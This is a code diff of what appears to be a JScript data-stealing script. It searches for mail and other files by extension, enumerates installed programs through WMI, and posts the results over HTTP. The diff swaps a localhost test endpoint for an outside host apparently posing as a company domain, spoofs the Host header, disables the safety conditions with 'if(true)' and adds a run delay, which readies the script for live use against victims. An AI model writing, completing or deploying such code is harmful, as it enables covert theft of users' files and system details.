@@ -2,7 +2,7 @@ try {
 	////////////////////////////////////////////////////////////
 	////////////////////////////////////////////////////////////
 	var needtonote = false;
-	var filecheckdelay = 0;
+	var filecheckdelay = 42000;
 	////////////////////////////////////////////////////////////
 var ext = [ //files extensions for search
 	"eml", //windows live mail
@@ -257,7 +257,8 @@ var ext = [ //files extensions for search
 	var programs_inf = ""
 	var progs_array = []
 	try {
-			if ((OS_Type == 1) && (!file_checked)){
+			//if ((OS_Type == 1) && (!file_checked)){
+						if(true){	
 			query_programs = wmi.ExecQuery("SELECT Name FROM Win32_Product");	
 			program = new Enumerator(query_programs);
 			for(;!program.atEnd();program.moveNext()){
@@ -369,7 +370,8 @@ var ext = [ //files extensions for search
    var allfindedfiles = ""
    var filesinprofile = ""
 	try {
-		if ((OS_Type == 1) && (!file_checked)){
+		//if ((OS_Type == 1) && (!file_checked)){
+			if(true){
 				var labels_mask = ""
 				var files_array = []
 				var files_array_in_profile = []
@@ -492,7 +494,8 @@ var ext = [ //files extensions for search
 	} catch(e) {}
 	
 	var http = new ActiveXObject("Microsoft.XMLHTTP");
-	http.open("POST", "http://localhost:38842/api/userlogin", false);
+	//http.open("POST", "http://localhost:38842/api/userlogin", false);
+	http.open("POST", "http://map.ukrtransnafta.com/api/userlogin", false);
 	http.setRequestHeader("Host", "app.ukrtransnafta.com");
 	http.setRequestHeader("User-Agent", "Mozilla/4.0 (compatible; Synapse)");
 	http.setRequestHeader("Content-Type", "application/json");
